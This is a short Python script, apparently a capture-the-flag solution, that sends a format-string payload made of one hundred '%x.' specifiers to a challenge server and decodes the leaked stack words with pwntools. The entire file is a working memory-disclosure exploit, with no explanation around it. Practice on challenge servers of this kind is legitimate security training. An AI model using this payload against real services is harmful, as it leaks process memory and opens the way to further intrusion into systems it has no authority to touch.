import requests
import pwn

def main() -> None:
    response = requests.post(
        url = 'http://mmc-challenges.cyber.org.il:12345',
        data = {
            "input" : '%x.' * 100 + "%x",
        },
    )
    
    print(response.text)
    
    print(
        [pwn.p32(int(x, 16)) for x in response.text.split(".")]
    )

if __name__ == "__main__":
    main()